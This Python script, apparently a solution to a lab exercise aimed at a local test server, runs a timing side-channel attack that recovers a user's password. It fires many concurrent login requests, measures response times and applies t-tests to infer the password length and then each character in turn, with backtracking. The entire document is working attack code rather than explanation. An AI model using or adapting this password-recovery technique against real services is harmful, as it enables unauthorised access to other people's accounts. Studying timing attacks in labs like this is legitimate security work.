import time
import requests
from statistics import median
from concurrent.futures import ThreadPoolExecutor
from scipy import stats
import numpy as np
from typing import List, Optional, Tuple
from dotenv import load_dotenv
import os

load_dotenv()

ID = os.getenv("ID")

# Configuration
SERVER_URL = "http://127.0.0.1"
USER_ID = ID  # Replace with your ID/username
DIFFICULTY = 4
CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
RETRIES = 300
WORKERS = 15
SIGNIFICANCE_LEVEL = 0.05
MIN_SAMPLES = 40  # Minimum samples needed for reliable t-test
MAX_BACKTRACK_ATTEMPTS = 3
MIN_TIME_INCREASE = 0.02  # Minimum time increase to consider (seconds)

def measure_single_request(url: str) -> float:
    try:
        start = time.time()
        requests.get(url)
        return time.time() - start
    except requests.exceptions.RequestException:
        return float("inf")

def get_timing_samples(url: str, retries: int, workers: int) -> List[float]:
    """
    Collects timing samples using thread pool, filtering out outliers.
    """
    timings = []
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(measure_single_request, url) for _ in range(retries)]
        for future in futures:
            result = future.result()
            if result != float("inf"):
                timings.append(result)
    
    if len(timings) < MIN_SAMPLES:
        return []
        
    # Remove outliers (values more than 2 standard deviations from mean)
    timings_array = np.array(timings)
    mean = np.mean(timings_array)
    std = np.std(timings_array)
    filtered_timings = timings_array[abs(timings_array - mean) <= 2 * std]
    
    return filtered_timings.tolist()

def is_timing_significant(new_samples: List[float], baseline_samples: List[float]) -> Tuple[bool, float]:
    """
    Performs a one-tailed t-test to determine if new_samples are significantly HIGHER than baseline_samples.
    Returns (is_significant, p_value)
    """
    if len(new_samples) < MIN_SAMPLES or (baseline_samples and len(baseline_samples) < MIN_SAMPLES):
        return False, 1.0
    
    # For first character, use minimum timing as baseline
    if not baseline_samples:
        return median(new_samples) > MIN_TIME_INCREASE, 0.0
    
    # Calculate medians for comparison
    new_median = median(new_samples)
    baseline_median = median(baseline_samples)
    
    # Only proceed with t-test if median increased by minimum threshold
    if new_median <= baseline_median + MIN_TIME_INCREASE:
        return False, 1.0
    
    # Perform one-tailed t-test
    t_stat, p_value = stats.ttest_ind(new_samples, baseline_samples)
    
    # Only consider significant if t_stat is positive (meaning new_samples has higher mean)
    is_significant = p_value < SIGNIFICANCE_LEVEL * 2 and t_stat > 0  # *2 because one-tailed
    
    return is_significant, p_value

def find_password_length(user: str, difficulty: int) -> Optional[int]:
    """
    Determines password length using timing analysis.
    """
    print("Determining password length...")
    base_password = "a"
    baseline_times = []
    
    for length in range(1, 33):
        test_password = base_password * length
        url = f"{SERVER_URL}/?user={user}&password={test_password}&difficulty={difficulty}"
        
        current_times = get_timing_samples(url, RETRIES, WORKERS)
        if not current_times:
            print(f"Length {length}: Not enough valid samples")
            continue
        
        current_median = median(current_times)
        is_significant, p_value = is_timing_significant(current_times, baseline_times)
        
        print(f"Length {length}, median time: {current_median:.5f}s, p-value: {p_value:.5f}")
        
        if is_significant and length > 1:
            print(f"Estimated length: {length}")
            return length
            
        baseline_times = current_times

    print("No length found.")
    return None

def test_character(password: str, char: str, position: int, length: int, user: str, 
                  difficulty: int) -> Tuple[List[float], float]:
    """
    Tests a single character at a position and returns timing samples and median.
    """
    candidate = password + char + "a" * (length - len(password) - 1)
    url = f"{SERVER_URL}/?user={user}&password={candidate}&difficulty={difficulty}"
    times = get_timing_samples(url, RETRIES, WORKERS)
    return times, median(times) if times else float("inf")

def find_password(user: str, difficulty: int, length: int) -> str:
    """
    Finds the password using timing analysis with statistical testing and backtracking.
    """
    print(f"Searching for password of length {length}...")
    password = ""
    position = 0
    baseline_times = []
    position_attempts = {i: 0 for i in range(length)}
    
    # Store timing data for each position for backtracking
    position_timings = {i: {} for i in range(length)}  # {position: {char: [timings]}}

    while position < length:
        if position_attempts[position] >= MAX_BACKTRACK_ATTEMPTS:
            if position > 0:
                position -= 1
                password = password[:-1]
                # Restore previous baseline times
                if position > 0:
                    prev_char = password[-1]
                    baseline_times = position_timings[position-1][prev_char]
                else:
                    baseline_times = []
                print(f"Backtracking to position {position}, current password: {password}")
                continue
            else:
                print("Failed to find password - exceeded maximum attempts at first position")
                return ""

        best_char = None
        best_times = []
        best_p_value = 1.0
        best_median = 0

        # Test each character at the current position
        for char in CHARACTERS:
            times, med_time = test_character(password, char, position, length, user, difficulty)
            if not times:
                continue

            # Store timing data for potential backtracking
            position_timings[position][char] = times

            is_significant, p_value = is_timing_significant(times, baseline_times)
            print(f"Position {position}, char '{char}', median: {med_time:.5f}s, p-value: {p_value:.5f}")

            if is_significant and med_time > best_median:
                best_char = char
                best_times = times
                best_p_value = p_value
                best_median = med_time

        if best_char is None:
            # No significant character found, increment attempts and try again
            position_attempts[position] += 1
            print(f"No significant character found at position {position}, attempt {position_attempts[position]}")
            continue

        # Found a significant character, move forward
        password += best_char
        baseline_times = best_times
        print(f"Found character at position {position}: '{best_char}' (p-value: {best_p_value:.5f})")
        print(f"Current password: {password}")
        
        position = position + 1  # Move forward once a valid character is found
        
    return password

if __name__ == "__main__":
    estimated_length = find_password_length(USER_ID, DIFFICULTY)
    if estimated_length:
        final_password = find_password(USER_ID, DIFFICULTY, estimated_length)
        print(f"Final password: {final_password}")